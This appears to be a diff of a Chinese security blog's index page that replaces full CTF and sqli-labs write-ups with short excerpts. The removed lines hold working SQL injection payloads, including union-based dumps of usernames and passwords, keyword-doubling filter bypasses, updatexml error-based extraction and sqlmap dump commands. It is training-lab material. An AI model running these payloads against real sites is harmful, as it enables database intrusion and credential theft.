+然后按照这个题给的意思应该是需要我们绕过这层层过滤，去访问admin.php。（PS:我尝试了直接访问，提示需要本地访问–localhos
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/hgameCTF之PHP trick.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -2017,21 +1803,19 @@ admin.php的源码如下：
       
         
           
-            <p>在网上看过多次sql报错注入的一些资料，感觉很多人都是套那套公式，而对于sql报错注入的原理却少有人提及，所以这里转载一篇大佬的博客，对于sql报错注入解释的比较详细<br><a href="https://blog.51cto.com/wt7315/1891458" target="_blank" rel="noopener">sql报错注入原理</a><br>然后自己尝试了在sqli-labs上操作了一下发现用and连接会出现一个问题，<br>大致明白问题出现在哪里了，这里就粗略归纳成为每多一个子查询，就需要新命名一次。</p>
-<img src="/有关sql报错注入一点小坑.htm/and.png">
-<p>而用union连接却不会出现，这种报错信息。搜索了一下网上有关该报错信息，领悟到前面需要多加入一个select语句，随后便报错注入成功。</p>
-<img src="/有关sql报错注入一点小坑.htm/and的修正版.png">
-<p>感觉这是小坑因此在这里记录一下。<br>下面是探索过程中使用的payload：</p>
-<img src="/有关sql报错注入一点小坑.htm/payload.png">
-<h1>sql报错注入目前熟悉的报错payload</h1>
-两个sqli-labs的使用实例:
-比较复杂的：
-<img src="/有关sql报错注入一点小坑.htm/fuzha.jpg">
-简单一点的updataxml():
-<img src="/有关sql报错注入一点小坑.htm/jiandan.jpg">
-这里才发现自己使用的方法有误，updatexml()应该是有三个参数才对，这里并没有正确的报错，而且由于单词拼写错误，导致根本没有使用对。
-最后还有一个函数extractvalue()使用方法和updatexml()相似，不过它只有两个参数
+            <p>
+              在网上看过多次sql报错注入的一些资料，感觉很多人都是套那套公式，而对于sql报错注入的原理却少有人提及，所以这里转载一篇大佬的博客，对于sql报错注入解释的比较详细sql报错注入原理然后自己尝试了在sqli-labs上操作了一下发现用and连接会出现一个问题，大致明白问题出现在哪里了，这里就粗略归
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/有关sql报错注入一点小坑.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -2220,56 +2004,23 @@ admin.php的源码如下：
       
         
           
-            <h1>第一次sql注入</h1>
+            <p>
+              第一次sql注入
 最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。
-<img src="/BugkuCTF-多次.htm/1.png">
+
 这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入'，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作，
-测试了两组payload，都是报错界面（后面的一个-其实都是两个-号）
-<pre><code>id=1'+or+1=1--+</code></pre>
-<pre><code>id=1'+order+by+2--+</code></pre>
-于是判断该题可能过滤了一些关键词，下面使用新姿势来测试究竟过滤了哪些关键词--异或法
-（sql中的异或符号为^，在该符号两侧的表达式均为真或均为假时，会返回假，其余情况返回真，于是使用该方法来判断过滤的关键词）
-<img src="/BugkuCTF-多次.htm/2.png">
-<pre><code>id=1'^(length("or")!=0)--+</code></pre>
-返回了正常界面，由于已经验证过表达式id=1为真，根据异或的真值规则可以判断出只有后面的式子为假，而后面表达式的意思为判断or字符的长度为几,length()
-会返回字符长度，由于sql里面0=False，所以后面这句表达式在于判断or字符是否为0，也就是是不是被过滤了掉了，由返回结果可以判断出or字符确实是被过滤掉了，
-通过这种方法类似的，我们可以判断select union and 关键词都被过滤掉了，其它的关键词如union回显注入里面存在的table column schema where都未被过滤掉，下面
-就开始注入了，可以透过双写的方式绕过关键词过滤，
-查字段数：(这里只是or被过滤掉了，只需要双写or即可)
-<pre><code>id=1'+oorrder+by+2--+</code></pre>
-<img src="/BugkuCTF-多次.htm/3.png">
-字段数为2，然后构造union查询注入，当然我们需要确定回显字段，
-<img src="/BugkuCTF-多次.htm/4.png">
-<pre><code>id=x'+ununionion+seselectlect+1,2--+</code></pre>
-随后爆表名：
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=database()--+</code></pre>
-<img src="/BugkuCTF-多次.htm/5.png">
-爆列名：
-<img src="/BugkuCTF-多次.htm/6.png">
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name='flag1'--+</code></pre>
-爆值：
-flag1为：
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(flag1)+from+flag1--+</code></pre>
-<img src="/BugkuCTF-多次.htm/7.png">
-然而flag并不是这个，转头去爆address的值
-<img src="/BugkuCTF-多次.htm/8.png">
-<pre><code>id=x'+ununionion+seselectlect+1,group_concat(address)+from+flag1--+</code></pre>
-<h1>第二次sql注入</h1>
-点击进入了下一关又是一个sql注入，一样的id参数，而这次居然有sql的错误回显，但测试了一下union select注入似乎不可以
-这次我们需要使用updatexml()函数的报错回显注入，需要了解该函数的可以自行百度，该函数一共有三个参数，总之第二个参数
-似乎能和回显注入一样，能够执行，因此下面payload如下
-爆表名：
-<pre><code>id=1'and+updatexml(1,concat('*-',(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),'*-'),3)--+</code></pre>
-<img src="/BugkuCTF-多次.htm/9.png">
-接着爆列名:
-<img src="/BugkuCTF-多次.htm/11.png">
-<pre><code>id=1'and+updatexml(1,concat('*-',(select+group_concat(column_name)+from+information_schema.columns+where+table_name='flag2'),'*-'),3)--+</code></pre>
-最后爆值找到flag：
-<pre><code>id=1'and+updatexml(1,concat('*-',(select+flag2+from+flag2),'-*'),3)--+</code></pre>
-updatexml()感觉在这道题的报错注入里面更像式标识符
-<img src="/BugkuCTF-多次.htm/10.png">
-到此为止本题结束。
+测试了两组payload，都是报
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/BugkuCTF-多次.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -2458,81 +2209,22 @@ updatexml()感觉在这道题的报错注入里面更像式标识符
       
         
           
-            <p>sql注入是常见的漏洞类型之一，所以最近就来玩玩sql注入了，DVWA里面的可以先简单熟悉一下SQL注入的操作，然后就可以来刷sqli-labs的题了，<br>磨练绕过技巧就靠这个玩意儿了。（注以下的一个减号其实是两个）</p>
-<h1>PART 1（手工注入）</h1>
+            <p>
+              sql注入是常见的漏洞类型之一，所以最近就来玩玩sql注入了，DVWA里面的可以先简单熟悉一下SQL注入的操作，然后就可以来刷sqli-labs的题了，磨练绕过技巧就靠这个玩意儿了。（注以下的一个减号其实是两个）
+PART 1（手工注入）
 先来看看sqli-labs第一题
-首先测试可用参数id是什么类型的注入，我们先随便输入一个id=1，得到数据库里面的数据，也就是说这是最基本的回显sql注入。
-<img src="/sqli-labs-1-5-小结.htm/1-0.png">
-<img src="/sqli-labs-1-5-小结.htm/1-1-2.png">
-<pre><code>id=1'</code></pre>
-这时候sql报错了，通过报错的提示，我们可以知道，这是一个字符型（‘’）的注入，因此，先将单引号放在那里闭合原有的参数，在用--+（+代替空格）
-来闭合后面的单引号。
-这时候sql语句就变成了
-<pre><code>select * from users where id='1'[这里插入payload]--+'(省略)</code></pre>
-的这种结构，因此先用order by （数字）爆字段数这里测试结果为3，即我们要保证select语句中有三个参数.然后就是确定回显的参数是什么了，由前面
-<img src="/sqli-labs-1-5-小结.htm/1-2.png">
-我们的输入id=1时回显了两行数据，可以知道有两个字段能够回显。
-这时候我们用
-<img src="/sqli-labs-1-5-小结.htm/1-3.png">
-<pre><code>id=1000'+union+select+1,2,3--+</code></pre>
-来判断回显参数，由结果可知后面两个参数能够回显，因此我们得到数据库的内容也主要从后面两个参数下手；
-随后：爆表名
-<pre><code>id=1000' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code></pre>
-<img src="/sqli-labs-1-5-小结.htm/1-5.png">
-接着：爆列名
-<img src="/sqli-labs-1-5-小结.htm/1-7-2.png">
-<pre><code>id=1000' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="users"--+</code></pre>
-最后：爆值
-<pre><code>id=1000' union select 1,group_concat(username),group_concat(password) from users--+</code></pre>
-<img src="/sqli-labs-1-5-小结.htm/1-9.png">
-这就是第一道sqli-labs的思路和过程了,后面几道题的思路和方法都和第一道大同小异，区别只是可控参数的类型不一样，比如第二道的参数类型就是数字型，
-这里提提第三道题，可控参数实际上是
-<pre><code>id=('[GET的内容]')</code></pre>
-第四道题的闭合方式和第三道类似，只是需要将'改成"而已。其余的payload和第一道题类似，这里不一一赘述了。
-第五道题开始就没有回显注入了，而是来到了SQL盲注的大门，我们按照回显注入的方式输入
-<pre><code>id=1</code></pre>
-<img src="/sqli-labs-1-5-小结.htm/2-1.png">
-发现没有回显数据，而是一串字符，但是这道题还算良心用经典方法
-<img src="/sqli-labs-1-5-小结.htm/2-2-2.png">
-<pre><code>id=1'</code></pre>
-发现还是'型的注入，这时候我们故意构造一个错误的语句，看看回显的是什么
-<pre><code>id=1'+and+1=2--+</code></pre>
-<pre><code>id=1'and+'1'='2'--+</code></pre>
-以上都可以得到错误的结果，这个语句要求前后都为真时才会返回数据，故意构造错误的语句是为了构造布尔型盲注，输入上面的payload之后我们可以将这个界面
-<img src="/sqli-labs-1-5-小结.htm/2-3.png">
-看作假，将输入id=1（YOU ARE IN.....）看作真，这样我们就可以判断我们输入的payload是否奏效了。下面演示猜解数据表名称（上图）
-<img src="/sqli-labs-1-5-小结.htm/2-4.png">
-<img src="/sqli-labs-1-5-小结.htm/2-5.png">
-<img src="/sqli-labs-1-5-小结.htm/2-6.png">
-这样我们就可以得到数据库名称的首字符的ASCII码值是115也就是s，依次类推能够得到数据库的名称。相似的我们也可以构造时间延迟型盲注。
-<img src="/sqli-labs-1-5-小结.htm/2-7.png">
-以上代码能够在第一个参数为真时，返回第二个参数（sleep(5)--休眠5秒）
-为假时返回第三个参数（1）；
-通过页面响应的时间我们就能够判断参数1是否成立，因此也可以采用这种方式进行数据库的猜解。但这样猜解太过麻烦了，因此我们需要用sqlmap这一神器进行自动
-注入。
-<h1>PART 2(自动注入):</h1>
-首先先使用
-<code><pre>python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" --current-db</pre></code>
-查询当前数据库名称
-<img src="/sqli-labs-1-5-小结.htm/3-1.png">
-<img src="/sqli-labs-1-5-小结.htm/3-1-2.png">
-随后再用<code><pre>python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" -D security --tables</pre></code>
-查询该数据库下的表名
-<img src="/sqli-labs-1-5-小结.htm/3-2.png">
-<img src="/sqli-labs-1-5-小结.htm/3-2-2.png">
-然后知道表名，按照流程来查列名
-<code><pre>python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" -D security -T users --columns</pre></code>
-得到列名，就可以开始查值了
-<img src="/sqli-labs-1-5-小结.htm/3-3.png">
-<img src="/sqli-labs-1-5-小结.htm/3-3-2.png">
-最后我们来爆值
-<code><pre>python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" -D security -T users -C "id,username,password" --dump</pre></code>
-得到数据库的数据如下
-<img src="/sqli-labs-1-5-小结.htm/3-4.png">
-<img src="/sqli-labs-1-5-小结.htm/3-4-2.png">
-
-
+首先测试可用参数id是什么
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/sqli-labs-1-5-小结.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
